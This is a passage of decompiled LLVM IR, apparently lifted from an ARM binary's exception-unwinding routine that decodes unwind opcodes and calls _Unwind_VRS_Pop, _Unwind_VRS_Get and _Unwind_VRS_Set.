  %v2_22f14 = inttoptr i32 %v1_22f14 to i8*
  %v3_22f14 = load i8, i8* %v2_22f14, align 1
  %v4_22f14 = zext i8 %v3_22f14 to i32
  store i32 %v4_22f14, i32* %r3.global-to-local, align 4
  %v2_22f18 = icmp eq i8 %v3_22f14, 0
  store i1 %v2_22f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22f18, label %dec_label_pc_22f64, label %dec_label_pc_22f28

dec_label_pc_22f28:                               ; preds = %dec_label_pc_22f14
  %v1_22f28 = add nsw i32 %v4_22f14, -1
  store i32 %v1_22f28, i32* %r3.global-to-local, align 4
  %v1_22f2c = trunc i32 %v1_22f28 to i8
  store i8 %v1_22f2c, i8* %v2_22f14, align 1
  %v0_22f30 = load i32, i32* @r5, align 4
  %v1_22f30 = add i32 %v0_22f30, 4
  %v2_22f30 = inttoptr i32 %v1_22f30 to i32*
  %v3_22f30 = load i32, i32* %v2_22f30, align 4
  store i32 %v3_22f30, i32* %r2.global-to-local, align 4
  %v1_22f34 = inttoptr i32 %v3_22f30 to i32*
  %v2_22f34 = load i32, i32* %v1_22f34, align 4
  store i32 %v2_22f34, i32* %r0.global-to-local, align 4
  %v4_22f34 = add i32 %v3_22f30, 4
  store i32 %v4_22f34, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_22f34, i32* %v2_22f30, align 4
  %v0_22f40 = load i32, i32* %r3.global-to-local, align 4
  %v1_22f40 = trunc i32 %v0_22f40 to i8
  %v2_22f40 = load i32, i32* @r5, align 4
  %v3_22f40 = add i32 %v2_22f40, 8
  %v4_22f40 = inttoptr i32 %v3_22f40 to i8*
  store i8 %v1_22f40, i8* %v4_22f40, align 1
  %v0_22f44 = load i32, i32* %r0.global-to-local, align 4
  %v1_22f44 = load i32, i32* @r5, align 4
  %v2_22f44 = inttoptr i32 %v1_22f44 to i32*
  store i32 %v0_22f44, i32* %v2_22f44, align 4
  br label %dec_label_pc_22f48

dec_label_pc_22f48:                               ; preds = %.thread48, %dec_label_pc_22f28
  %v0_22f48 = load i32, i32* %r0.global-to-local, align 4
  %v3_22f48 = udiv i32 %v0_22f48, 16777216
  %v1_22f4c = urem i32 %v3_22f48, 16
  %v3_22f50 = mul i32 %v0_22f48, 256
  store i32 %v3_22f50, i32* %r0.global-to-local, align 4
  %v1_22f54 = add nuw nsw i32 %v1_22f4c, 1
  store i32 %v1_22f54, i32* %r2.global-to-local, align 4
  %v1_22f58 = and i32 %v3_22f48, 240
  store i32 %v1_22f58, i32* %r3.global-to-local, align 4
  %v1_22f5c = load i32, i32* @r5, align 4
  %v2_22f5c = inttoptr i32 %v1_22f5c to i32*
  store i32 %v3_22f50, i32* %v2_22f5c, align 4
  %v0_22f60 = load i32, i32* %r2.global-to-local, align 4
  %v1_22f60 = load i32, i32* %r3.global-to-local, align 4
  %v4_22f60 = mul i32 %v1_22f60, 4096
  %v5_22f60 = or i32 %v4_22f60, %v0_22f60
  br label %dec_label_pc_22f64

dec_label_pc_22f64:                               ; preds = %dec_label_pc_22f14, %dec_label_pc_22f48
  %storemerge131 = phi i32 [ %v5_22f60, %dec_label_pc_22f48 ], [ 720897, %dec_label_pc_22f14 ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22de4

dec_label_pc_22f6c:                               ; preds = %dec_label_pc_22d28
  %v0_22f6c = load i32, i32* @r5, align 4
  %v1_22f6c = add i32 %v0_22f6c, 8
  %v2_22f6c = inttoptr i32 %v1_22f6c to i8*
  %v3_22f6c = load i8, i8* %v2_22f6c, align 1
  %v4_22f6c = zext i8 %v3_22f6c to i32
  store i32 %v4_22f6c, i32* %r3.global-to-local, align 4
  %v2_22f70 = icmp eq i8 %v3_22f6c, 0
  store i1 %v2_22f70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22f70, label %dec_label_pc_22f80, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_22f6c
  %v2_22f74 = add nsw i32 %v4_22f6c, -1
  store i32 %v2_22f74, i32* %r3.global-to-local, align 4
  %v2_22f78 = trunc i32 %v2_22f74 to i8
  store i8 %v2_22f78, i8* %v2_22f6c, align 1
  %v0_22f7c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22f7c.pr.pr, label %.thread52.dec_label_pc_22f80_crit_edge, label %dec_label_pc_22fb4

.thread52.dec_label_pc_22f80_crit_edge:           ; preds = %.thread52
  %v0_22f80.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_22f80

dec_label_pc_22f80:                               ; preds = %.thread52.dec_label_pc_22f80_crit_edge, %dec_label_pc_22f6c
  %v2_22f98 = phi i32 [ %v0_22f80.pre, %.thread52.dec_label_pc_22f80_crit_edge ], [ %v0_22f6c, %dec_label_pc_22f6c ]
  %v1_22f80 = add i32 %v2_22f98, 9
  %v2_22f80 = inttoptr i32 %v1_22f80 to i8*
  %v3_22f80 = load i8, i8* %v2_22f80, align 1
  %v4_22f80 = zext i8 %v3_22f80 to i32
  store i32 %v4_22f80, i32* %r3.global-to-local, align 4
  %v2_22f84 = icmp eq i8 %v3_22f80, 0
  store i1 %v2_22f84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22f84, label %dec_label_pc_22fd0, label %dec_label_pc_22f94

dec_label_pc_22f94:                               ; preds = %dec_label_pc_22f80
  %v1_22f94 = add nsw i32 %v4_22f80, -1
  store i32 %v1_22f94, i32* %r3.global-to-local, align 4
  %v1_22f98 = trunc i32 %v1_22f94 to i8
  store i8 %v1_22f98, i8* %v2_22f80, align 1
  %v0_22f9c = load i32, i32* @r5, align 4
  %v1_22f9c = add i32 %v0_22f9c, 4
  %v2_22f9c = inttoptr i32 %v1_22f9c to i32*
  %v3_22f9c = load i32, i32* %v2_22f9c, align 4
  store i32 %v3_22f9c, i32* %r2.global-to-local, align 4
  %v1_22fa0 = inttoptr i32 %v3_22f9c to i32*
  %v2_22fa0 = load i32, i32* %v1_22fa0, align 4
  store i32 %v2_22fa0, i32* %r0.global-to-local, align 4
  %v4_22fa0 = add i32 %v3_22f9c, 4
  store i32 %v4_22fa0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_22fa0, i32* %v2_22f9c, align 4
  %v0_22fac = load i32, i32* %r3.global-to-local, align 4
  %v1_22fac = trunc i32 %v0_22fac to i8
  %v2_22fac = load i32, i32* @r5, align 4
  %v3_22fac = add i32 %v2_22fac, 8
  %v4_22fac = inttoptr i32 %v3_22fac to i8*
  store i8 %v1_22fac, i8* %v4_22fac, align 1
  %v0_22fb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_22fb0 = load i32, i32* @r5, align 4
  %v2_22fb0 = inttoptr i32 %v1_22fb0 to i32*
  store i32 %v0_22fb0, i32* %v2_22fb0, align 4
  br label %dec_label_pc_22fb4

dec_label_pc_22fb4:                               ; preds = %.thread52, %dec_label_pc_22f94
  %v0_22fb4 = load i32, i32* %r0.global-to-local, align 4
  %v3_22fb4 = udiv i32 %v0_22fb4, 16777216
  %v1_22fb8 = urem i32 %v3_22fb4, 16
  %v3_22fbc = mul i32 %v0_22fb4, 256
  store i32 %v3_22fbc, i32* %r0.global-to-local, align 4
  %v1_22fc0 = add nuw nsw i32 %v1_22fb8, 1
  store i32 %v1_22fc0, i32* %r2.global-to-local, align 4
  %v1_22fc4 = and i32 %v3_22fb4, 240
  store i32 %v1_22fc4, i32* %r3.global-to-local, align 4
  %v1_22fc8 = load i32, i32* @r5, align 4
  %v2_22fc8 = inttoptr i32 %v1_22fc8 to i32*
  store i32 %v3_22fbc, i32* %v2_22fc8, align 4
  %v0_22fcc = load i32, i32* %r2.global-to-local, align 4
  %v1_22fcc = load i32, i32* %r3.global-to-local, align 4
  %v4_22fcc = mul i32 %v1_22fcc, 4096
  %v5_22fcc = or i32 %v4_22fcc, %v0_22fcc
  br label %dec_label_pc_22fd0

dec_label_pc_22fd0:                               ; preds = %dec_label_pc_22f80, %dec_label_pc_22fb4
  %storemerge130 = phi i32 [ %v5_22fcc, %dec_label_pc_22fb4 ], [ 720897, %dec_label_pc_22f80 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22de4

dec_label_pc_22fd8:                               ; preds = %dec_label_pc_22d04
  %v0_22fd8 = load i32, i32* @r5, align 4
  %v1_22fd8 = add i32 %v0_22fd8, 8
  %v2_22fd8 = inttoptr i32 %v1_22fd8 to i8*
  %v3_22fd8 = load i8, i8* %v2_22fd8, align 1
  %v4_22fd8 = zext i8 %v3_22fd8 to i32
  store i32 %v4_22fd8, i32* %r3.global-to-local, align 4
  %v2_22fdc = icmp eq i8 %v3_22fd8, 0
  store i1 %v2_22fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_22fdc, label %dec_label_pc_23184, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_22fd8
  %v2_22fe0 = add nsw i32 %v4_22fd8, -1
  store i32 %v2_22fe0, i32* %r3.global-to-local, align 4
  %v2_22fe4 = trunc i32 %v2_22fe0 to i8
  store i8 %v2_22fe4, i8* %v2_22fd8, align 1
  %v0_22fe8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_22fe8.pr.pr, label %.thread56.dec_label_pc_23184_crit_edge, label %dec_label_pc_22fec

.thread56.dec_label_pc_23184_crit_edge:           ; preds = %.thread56
  %v0_23184.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_23184

dec_label_pc_22fec:                               ; preds = %.thread56, %dec_label_pc_23190
  %v0_22fec = load i32, i32* %r0.global-to-local, align 4
  %v3_22fec = udiv i32 %v0_22fec, 16777216
  store i32 %v3_22fec, i32* %r3.global-to-local, align 4
  store i32 %v3_22fec, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_22fec, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_22ff4 = mul i32 %v0_22fec, 256
  store i32 %v3_22ff4, i32* %r0.global-to-local, align 4
  %v1_22ff8 = load i32, i32* @r5, align 4
  %v2_22ff8 = inttoptr i32 %v1_22ff8 to i32*
  store i32 %v3_22ff4, i32* %v2_22ff8, align 4
  br i1 %tmp184, label %dec_label_pc_22db4, label %dec_label_pc_23000

dec_label_pc_23000:                               ; preds = %dec_label_pc_22fec
  %v0_23000 = load i32, i32* %r3.global-to-local, align 4
  %v1_23000 = and i32 %v0_23000, 240
  store i32 %v1_23000, i32* %r3.global-to-local, align 4
  %v2_23000 = icmp eq i32 %v1_23000, 0
  store i1 %v2_23000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23000, label %dec_label_pc_23008, label %dec_label_pc_22db4

dec_label_pc_23008:                               ; preds = %dec_label_pc_23000
  %v0_23008 = load i32, i32* @r7, align 4
  store i32 %v0_23008, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_23010 = load i32, i32* %r2.global-to-local, align 4
  %v4_23010 = call i32 @_Unwind_VRS_Pop(i32 %v0_23008, i32 4, i32 %v2_23010, i32 0)
  store i32 %v4_23010, i32* %r0.global-to-local, align 4
  %v2_23014 = icmp eq i32 %v4_23010, 0
  store i1 %v2_23014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23014, label %dec_label_pc_22ae4.backedge, label %dec_label_pc_2301c

dec_label_pc_2301c:                               ; preds = %dec_label_pc_23008
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22c0c

dec_label_pc_23024:                               ; preds = %dec_label_pc_22e50
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_23030 = load i32, i32* @r7, align 4
  store i32 %v0_23030, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_2303c = call i32 @_Unwind_VRS_Get(i32 %v0_23030, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_2303c, i32* %r0.global-to-local, align 4
  %v0_23040 = load i32, i32* @r5, align 4
  %v1_23040 = add i32 %v0_23040, 8
  %v2_23040 = inttoptr i32 %v1_23040 to i8*
  %v3_23040 = load i8, i8* %v2_23040, align 1
  %v4_23040 = zext i8 %v3_23040 to i32
  store i32 %v4_23040, i32* %r1.global-to-local, align 4
  %v2_23044 = icmp eq i8 %v3_23040, 0
  store i1 %v2_23044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23044, label %dec_label_pc_23054, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_23024
  %v2_23048 = add nsw i32 %v4_23040, -1
  store i32 %v2_23048, i32* %r3.global-to-local, align 4
  %v2_2304c = trunc i32 %v2_23048 to i8
  store i8 %v2_2304c, i8* %v2_23040, align 1
  %v0_23050.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_23050.pr.pr, label %.thread58.dec_label_pc_23054_crit_edge, label %dec_label_pc_23080

.thread58.dec_label_pc_23054_crit_edge:           ; preds = %.thread58
  %v0_23054.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_23054

dec_label_pc_23054:                               ; preds = %.thread58.dec_label_pc_23054_crit_edge, %dec_label_pc_23024
  %v2_23068 = phi i32 [ %v0_23054.pre, %.thread58.dec_label_pc_23054_crit_edge ], [ %v0_23040, %dec_label_pc_23024 ]
  %v1_23054 = add i32 %v2_23068, 9
  %v2_23054 = inttoptr i32 %v1_23054 to i8*
  %v3_23054 = load i8, i8* %v2_23054, align 1
  %v4_23054 = zext i8 %v3_23054 to i32
  store i32 %v4_23054, i32* %r3.global-to-local, align 4
  %v2_23058 = icmp eq i8 %v3_23054, 0
  store i1 %v2_23058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23058, label %bb158, label %dec_label_pc_23064

bb158:                                            ; preds = %dec_label_pc_23054
  %v1_2305c = load i32, i32* @r6, align 4
  store i32 %v1_2305c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_230a8

dec_label_pc_23064:                               ; preds = %dec_label_pc_23054
  %v1_23064 = add nsw i32 %v4_23054, -1
  store i32 %v1_23064, i32* %r3.global-to-local, align 4
  %v1_23068 = trunc i32 %v1_23064 to i8
  store i8 %v1_23068, i8* %v2_23054, align 1
  %v0_2306c = load i32, i32* @r5, align 4
  %v1_2306c = add i32 %v0_2306c, 4
  %v2_2306c = inttoptr i32 %v1_2306c to i32*
  %v3_2306c = load i32, i32* %v2_2306c, align 4
  store i32 %v3_2306c, i32* %r2.global-to-local, align 4
  %v1_23070 = inttoptr i32 %v3_2306c to i32*
  %v2_23070 = load i32, i32* %v1_23070, align 4
  store i32 %v2_23070, i32* %r0.global-to-local, align 4
  %v4_23070 = add i32 %v3_2306c, 4
  store i32 %v4_23070, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_23078 = inttoptr i32 %v0_2306c to i32*
  store i32 %v2_23070, i32* %v1_23078, align 4
  %v5_23078 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_23078, i32* %v2_2306c, align 4
  %v0_2307c = load i32, i32* %r3.global-to-local, align 4
  %v1_2307c = trunc i32 %v0_2307c to i8
  %v2_2307c = load i32, i32* @r5, align 4
  %v3_2307c = add i32 %v2_2307c, 8
  %v4_2307c = inttoptr i32 %v3_2307c to i8*
  store i8 %v1_2307c, i8* %v4_2307c, align 1
  br label %dec_label_pc_23080

dec_label_pc_23080:                               ; preds = %.thread58, %dec_label_pc_23064
  %v0_23080 = load i32, i32* @r5, align 4
  %v1_23080 = inttoptr i32 %v0_23080 to i32*
  %v2_23080 = load i32, i32* %v1_23080, align 4
  store i32 %v2_23080, i32* %r3.global-to-local, align 4
  %v3_23084 = mul i32 %v2_23080, 256
  store i32 %v3_23084, i32* %r0.global-to-local, align 4
  %v3_23088 = udiv i32 %v2_23080, 16777216
  store i32 %v3_23088, i32* %r2.global-to-local, align 4
  store i32 %v3_23084, i32* %v1_23080, align 4
  %v0_23090 = load i32, i32* %r2.global-to-local, align 4
  %v1_23090 = and i32 %v0_23090, 128
  %v2_23090 = icmp eq i32 %v1_23090, 0
  store i1 %v2_23090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23090, label %.thread129, label %dec_label_pc_230a4

.thread129:                                       ; preds = %dec_label_pc_23080
  %v4_23094 = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_23094, i32* %ip.global-to-local, align 4
  %v1_23098 = urem i32 %v0_23090, 256
  store i32 %v1_23098, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_23118

dec_label_pc_230a4:                               ; preds = %dec_label_pc_23080
  %v1_2309863 = urem i32 %v0_23090, 256
  store i32 %v1_2309863, i32* %r2.global-to-local, align 4
  %v0_230a4 = load i32, i32* @r5, align 4
  %v1_230a4 = add i32 %v0_230a4, 8
  %v2_230a4 = inttoptr i32 %v1_230a4 to i8*
  %v3_230a4 = load i8, i8* %v2_230a4, align 1
  %v4_230a4 = zext i8 %v3_230a4 to i32
  store i32 %v4_230a4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_230a8

dec_label_pc_230a8:                               ; preds = %bb158, %dec_label_pc_230a4
  %v3_230c899 = phi i32 [ %v2_23068, %bb158 ], [ %v0_230a4, %dec_label_pc_230a4 ]
  %v0_230b092 = phi i32 [ %v1_2305c, %bb158 ], [ %v1_2309863, %dec_label_pc_230a4 ]
  %v3_230a8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_230a8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_230b0

dec_label_pc_230b0:                               ; preds = %dec_label_pc_230b0.backedge, %dec_label_pc_230a8
  %v3_230c8 = phi i32 [ %v3_230c8100, %dec_label_pc_230b0.backedge ], [ %v3_230c899, %dec_label_pc_230a8 ]
  %v0_230c4 = phi i32 [ %v2_230b4.pre, %dec_label_pc_230b0.backedge ], [ 2, %dec_label_pc_230a8 ]
  %v0_230b4 = phi i32 [ %v0_230b4.pre, %dec_label_pc_230b0.backedge ], [ %v3_230a8, %dec_label_pc_230a8 ]
  %v0_230b0 = phi i32 [ %v0_230b095, %dec_label_pc_230b0.backedge ], [ %v0_230b092, %dec_label_pc_230a8 ]
  %v1_230b0 = urem i32 %v0_230b0, 128
  %v7_230b4 = shl i32 %v1_230b0, %v0_230c4
  %v8_230b4 = add i32 %v7_230b4, %v0_230b4
  store i32 %v8_230b4, i32* %ip.global-to-local, align 4
  %v0_230b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_230b8 = icmp eq i32 %v0_230b8, 0
  store i1 %v2_230b8, i1* %cpsr_z.global-to-local, align 1
  %v1_230bc = add i32 %v0_230b8, -1
  store i32 %v1_230bc, i32* %r3.global-to-local, align 4
  store i32 %v8_230b4, i32* %stack_var_-36, align 4
  %v1_230c4 = add i32 %v0_230c4, 7
  store i32 %v1_230c4, i32* @lr, align 4
  br i1 %v2_230b8, label %dec_label_pc_230d0, label %bb159

bb159:                                            ; preds = %dec_label_pc_230b0
  %v2_230c8 = trunc i32 %v1_230bc to i8
  %v4_230c8 = add i32 %v3_230c8, 8
  %v5_230c8 = inttoptr i32 %v4_230c8 to i8*
  store i8 %v2_230c8, i8* %v5_230c8, align 1
  %v0_230cc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_230cc.pr, label %.dec_label_pc_230d0_crit_edge, label %dec_label_pc_230fc

.dec_label_pc_230d0_crit_edge:                    ; preds = %bb159
  %v0_230d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_230d0

dec_label_pc_230d0:                               ; preds = %.dec_label_pc_230d0_crit_edge, %dec_label_pc_230b0
  %v2_230e8 = phi i32 [ %v0_230d0.pre, %.dec_label_pc_230d0_crit_edge ], [ %v3_230c8, %dec_label_pc_230b0 ]
  %v1_230d0 = add i32 %v2_230e8, 9
  %v2_230d0 = inttoptr i32 %v1_230d0 to i8*
  %v3_230d0 = load i8, i8* %v2_230d0, align 1
  %v4_230d0 = zext i8 %v3_230d0 to i32
  store i32 %v4_230d0, i32* %r3.global-to-local, align 4
  %v2_230d4 = icmp eq i8 %v3_230d0, 0
  store i1 %v2_230d4, i1* %cpsr_z.global-to-local, align 1
  %v1_230d8 = add nsw i32 %v4_230d0, -1
  store i32 %v1_230d8, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_230d4, label %dec_label_pc_230b0.backedge, label %dec_label_pc_230e4

dec_label_pc_230e4:                               ; preds = %dec_label_pc_230d0
  %v1_230e4 = add i32 %v2_230e8, 4
  %v2_230e4 = inttoptr i32 %v1_230e4 to i32*
  %v3_230e4 = load i32, i32* %v2_230e4, align 4
  store i32 %v3_230e4, i32* %r2.global-to-local, align 4
  %v1_230e8 = trunc i32 %v1_230d8 to i8
  store i8 %v1_230e8, i8* %v2_230d0, align 1
  %v0_230ec = load i32, i32* %r2.global-to-local, align 4
  %v1_230ec = inttoptr i32 %v0_230ec to i32*
  %v2_230ec = load i32, i32* %v1_230ec, align 4
  store i32 %v2_230ec, i32* %r0.global-to-local, align 4
  %v4_230ec = add i32 %v0_230ec, 4
  store i32 %v4_230ec, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_230f4 = load i32, i32* @r5, align 4
  %v3_230f4 = add i32 %v2_230f4, 8
  %v4_230f4 = inttoptr i32 %v3_230f4 to i8*
  store i8 3, i8* %v4_230f4, align 1
  %v0_230f8 = load i32, i32* @r5, align 4
  %v1_230f8 = inttoptr i32 %v0_230f8 to i32*
  %v2_230f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_230f8, i32* %v1_230f8, align 4
  %v3_230f8 = add i32 %v0_230f8, 4
  %v4_230f8 = inttoptr i32 %v3_230f8 to i32*
  %v5_230f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_230f8, i32* %v4_230f8, align 4
  br label %dec_label_pc_230fc

dec_label_pc_230fc:                               ; preds = %bb159, %dec_label_pc_230e4
  %v0_230fc = load i32, i32* @r5, align 4
  %v1_230fc = inttoptr i32 %v0_230fc to i32*
  %v2_230fc = load i32, i32* %v1_230fc, align 4
  store i32 %v2_230fc, i32* %r3.global-to-local, align 4
  %v3_23100 = udiv i32 %v2_230fc, 16777216
  store i32 %v3_23100, i32* %r2.global-to-local, align 4
  %v1_23104 = and i32 %v3_23100, 128
  %v2_23104 = icmp eq i32 %v1_23104, 0
  store i1 %v2_23104, i1* %cpsr_z.global-to-local, align 1
  %v3_23108 = mul i32 %v2_230fc, 256
  store i32 %v3_23108, i32* %r0.global-to-local, align 4
  store i32 %v3_23108, i32* %v1_230fc, align 4
  %v0_23110 = load i32, i32* %r2.global-to-local, align 4
  %v1_23110 = urem i32 %v0_23110, 256
  store i32 %v1_23110, i32* %r2.global-to-local, align 4
  br i1 %v2_23104, label %dec_label_pc_23118.loopexit, label %dec_label_pc_23144

dec_label_pc_23118.loopexit:                      ; preds = %dec_label_pc_230fc
  %v0_2311c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_23120.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_23118

dec_label_pc_23118:                               ; preds = %dec_label_pc_23118.loopexit, %.thread129
  %v2_23120 = phi i32 [ 2, %.thread129 ], [ %v2_23120.pre, %dec_label_pc_23118.loopexit ]
  %v0_2311c = phi i32 [ %v4_23094, %.thread129 ], [ %v0_2311c.pre, %dec_label_pc_23118.loopexit ]
  %v0_23118 = phi i32 [ %v1_23098, %.thread129 ], [ %v1_23110, %dec_label_pc_23118.loopexit ]
  %v1_23118 = urem i32 %v0_23118, 128
  %v1_2311c = add i32 %v0_2311c, 516
  %v7_23120 = shl i32 %v1_23118, %v2_23120
  %v8_23120 = add i32 %v1_2311c, %v7_23120
  store i32 %v8_23120, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_23128 = load i32, i32* @r7, align 4
  store i32 %v0_23128, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_23120, i32* %stack_var_-36, align 4
  %v5_2313c = call i32 @_Unwind_VRS_Set(i32 %v0_23128, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_2313c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22ae4.backedge

dec_label_pc_23144:                               ; preds = %dec_label_pc_230fc
  %v0_23144 = load i32, i32* @r5, align 4
  %v1_23144 = add i32 %v0_23144, 8
  %v2_23144 = inttoptr i32 %v1_23144 to i8*
  %v3_23144 = load i8, i8* %v2_23144, align 1
  %v4_23144 = zext i8 %v3_23144 to i32
  store i32 %v4_23144, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_230b0.backedge

dec_label_pc_230b0.backedge:                      ; preds = %dec_label_pc_23144, %dec_label_pc_230d0
  %v3_230c8100 = phi i32 [ %v0_23144, %dec_label_pc_23144 ], [ %v2_230e8, %dec_label_pc_230d0 ]
  %v0_230b095 = phi i32 [ %v1_23110, %dec_label_pc_23144 ], [ 176, %dec_label_pc_230d0 ]
  %v0_230b4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_230b4.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_230b0

dec_label_pc_2314c:                               ; preds = %dec_label_pc_22e48
  %v0_2314c = load i32, i32* @r5, align 4
  %v1_2314c = add i32 %v0_2314c, 8
  %v2_2314c = inttoptr i32 %v1_2314c to i8*
  %v3_2314c = load i8, i8* %v2_2314c, align 1
  %v4_2314c = zext i8 %v3_2314c to i32
  store i32 %v4_2314c, i32* %r3.global-to-local, align 4
  %v2_23150 = icmp eq i8 %v3_2314c, 0
  store i1 %v2_23150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23150, label %dec_label_pc_231b4, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_2314c
  %v2_23154 = add nsw i32 %v4_2314c, -1
  store i32 %v2_23154, i32* %r3.global-to-local, align 4
  %v2_23158 = trunc i32 %v2_23154 to i8
  store i8 %v2_23158, i8* %v2_2314c, align 1
  %v0_2315c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2315c.pr.pr, label %.thread66.dec_label_pc_231b4_crit_edge, label %dec_label_pc_23160

.thread66.dec_label_pc_231b4_crit_edge:           ; preds = %.thread66
  %v0_231b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_231b4

dec_label_pc_23160:                               ; preds = %.thread66, %dec_label_pc_231c0
  %v0_23160 = load i32, i32* %r0.global-to-local, align 4
  %v3_23160 = udiv i32 %v0_23160, 16777216
  store i32 %v3_23160, i32* %r3.global-to-local, align 4
  store i32 %v3_23160, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_23160, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_23168 = mul i32 %v0_23160, 256
  store i32 %v3_23168, i32* %r0.global-to-local, align 4
  %v1_2316c = load i32, i32* @r5, align 4
  %v2_2316c = inttoptr i32 %v1_2316c to i32*
  store i32 %v3_23168, i32* %v2_2316c, align 4
  br i1 %tmp185, label %dec_label_pc_22db4, label %dec_label_pc_23174

dec_label_pc_23174:                               ; preds = %dec_label_pc_23160
  %v0_23174 = load i32, i32* %r3.global-to-local, align 4
  %v1_23174 = and i32 %v0_23174, 240
  store i32 %v1_23174, i32* %r1.global-to-local, align 4
  %v2_23174 = icmp eq i32 %v1_23174, 0
  store i1 %v2_23174, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23174, label %dec_label_pc_23174.dec_label_pc_22de4_crit_edge, label %dec_label_pc_2317c

dec_label_pc_23174.dec_label_pc_22de4_crit_edge:  ; preds = %dec_label_pc_23174
  %v2_22dec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_22de4

dec_label_pc_2317c:                               ; preds = %dec_label_pc_23174
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22c0c

dec_label_pc_23184:                               ; preds = %.thread56.dec_label_pc_23184_crit_edge, %dec_label_pc_22fd8
  %v2_23194 = phi i32 [ %v0_23184.pre, %.thread56.dec_label_pc_23184_crit_edge ], [ %v0_22fd8, %dec_label_pc_22fd8 ]
  %v1_23184 = add i32 %v2_23194, 9
  %v2_23184 = inttoptr i32 %v1_23184 to i8*
  %v3_23184 = load i8, i8* %v2_23184, align 1
  %v4_23184 = zext i8 %v3_23184 to i32
  store i32 %v4_23184, i32* %r3.global-to-local, align 4
  %v2_23188 = icmp eq i8 %v3_23184, 0
  store i1 %v2_23188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_23188, label %dec_label_pc_22db4, label %dec_label_pc_23190

dec_label_pc_23190:                               ; preds = %dec_label_pc_23184
  %v1_23190 = add nsw i32 %v4_23184, -1
  store i32 %v1_23190, i32* %r3.global-to-local, align 4
  %v1_23194 = trunc i32 %v1_23190 to i8
  store i8 %v1_23194, i8* %v2_23184, align 1
  %v0_23198 = load i32, i32* @r5, align 4
  %v1_23198 = add i32 %v0_23198, 4
  %v2_23198 = inttoptr i32 %v1_23198 to i32*
  %v3_23198 = load i32, i32* %v2_23198, align 4
  store i32 %v3_23198, i32* %r2.global-to-local, align 4
  %v1_2319c = inttoptr i32 %v3_23198 to i32*
  %v2_2319c = load i32, i32* %v1_2319c, align 4
  store i32 %v2_2319c, i32* %r0.global-to-local, align 4
  %v4_2319c = add i32 %v3_23198, 4
  store i32 %v4_2319c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
